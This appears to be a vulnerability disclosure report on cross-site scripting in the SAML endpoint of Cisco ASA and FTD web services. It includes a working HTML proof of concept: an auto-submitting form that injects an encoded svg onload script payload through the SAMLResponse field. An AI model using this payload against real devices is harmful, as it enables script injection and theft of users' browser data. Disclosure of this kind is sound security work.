## Vulnerability Information
Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. 

 Steps To Reproduce 

 Go to this  URL 

 http://www.info-sec.cl/post-xss-███████.html 

 HTML POC:
 
 <html>
  <body>
 <script>history.pushState('', '', '/')</script>
 <form action='https://'████████'/+CSCOE+/saml/sp/acs?tgname=a' method='POST'>
 <input type='hidden' name='SAMLResponse' value='&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookies&#41;&gt;'/>
 </form>
 <script>
 document.forms[0].submit();
</script>
</body>
</html>

## Impact

- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.
 - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. 

 Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.
